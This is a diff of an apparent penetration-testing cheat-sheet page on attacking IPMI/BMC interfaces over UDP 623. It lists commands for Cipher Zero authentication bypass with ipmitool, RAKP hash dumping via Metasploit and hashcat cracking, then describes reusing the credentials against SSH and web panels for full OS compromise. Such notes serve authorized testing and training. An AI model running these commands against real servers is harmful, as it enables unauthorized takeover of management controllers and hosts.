@@ -3,40 +3,39 @@ id: ipmi-enum
 title: IPMI Enumeration
 stage: enumeration
 tags: [linux, windows]
-tools:
-  - nmap -sU -p623 --script ipmi-version,ipmi-brute $TARGET
-  - msfconsole → use auxiliary/scanner/ipmi/ipmi_dumphashes
-  - ipmitool -I lanplus -H $TARGET -U admin -P admin chassis status
-  - hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
-leads_to: [password-spray, ssh-access]
-summary: Exploit IPMI 2.0 to dump password hashes or bypass authentication via Cipher 0.
+summary: Exploit IPMI 2.0 to dump password hashes via RAKP authentication or bypass auth entirely with Cipher 0 — cracked hashes are frequently reused for SSH and web admin panels.
+leads_to:
+  - password-spray
+  - ssh-access
 ---
 
-## Detect IPMI (UDP 623)
+## Prerequisites
 
-IPMI runs on UDP — missed by default TCP-only scans.
+Port 623 UDP open — won't appear in TCP scans. Common on servers with out-of-band management (Dell iDRAC, HP iLO, Supermicro BMC).
+
+IPMI (Intelligent Platform Management Interface) provides out-of-band server management and is often overlooked. The IPMI 2.0 RAKP protocol design flaw means any client can request a password hash from the BMC without authenticating — the hash is then crackable offline. Cipher Suite 0 is an even worse bug: it authenticates with any password, including blank.
+
+## Quick Win
+
+> Detect IPMI and check for Cipher 0 — bypass auth before trying to crack hashes.
 
 ```bash
-nmap -sU -p623 $TARGET
 nmap -sU -p623 --script ipmi-version $TARGET
-# Output: Intelligent Platform Management Interface (IPMI)
+nmap -sU -p623 --script ipmi-cipher-zero $TARGET
 ```
 
 ## Cipher Zero Authentication Bypass
 
-IPMI 2.0 with Cipher Suite 0 authenticates with **any** password:
+> If vulnerable, any password (including blank) authenticates — instant access.
 
 ```bash
-nmap -sU -p623 --script ipmi-cipher-zero $TARGET
-
-# If vulnerable, connect with anything as password
 ipmitool -I lanplus -C 0 -H $TARGET -U admin -P anything chassis status
 ipmitool -I lanplus -C 0 -H $TARGET -U ADMIN -P '' user list
 ```
 
-## Hash Dumping — Metasploit
+## Hash Dumping (Metasploit)
 
-IPMI 2.0 RAKP authentication sends a salted SHA1/MD5 hash of the password to the client, which can be captured:
+> RAKP protocol sends a salted SHA1/MD5 hash of the password to any requester.
 
 ```bash
 msfconsole -q
@@ -46,7 +45,10 @@ set OUTPUTFILE /tmp/ipmi_hashes.txt
 run
 ```
 
-Crack the hashes:
+## Crack Hashes
+
+> Mode 7300 for IPMI RAKP — rockyou cracks most default vendor passwords quickly.
+
 ```bash
 hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
@@ -69,9 +71,6 @@ for user in admin ADMIN root administrator; do
 done
 ```
 
-## Notes
+## Leads To
 
-- IPMI runs on **UDP 623** — always include `-sU` in your scan
-- Cracked IPMI credentials are frequently reused for SSH, web admin panels, iDRAC web UIs
-- BMCs often have a separate management NIC on a different subnet — check for alternate IPs
-- After cracking, log into the web portal or ipmitool — you can power cycle the machine and boot to ISO
+Cracked or default IPMI credentials → try immediately against SSH, web admin panels, and the iDRAC/iLO web UI (password-spray). BMC access with valid creds → power cycle, virtual media mount, console access → full OS compromise. Credentials often reused at the OS level — check SSH first.
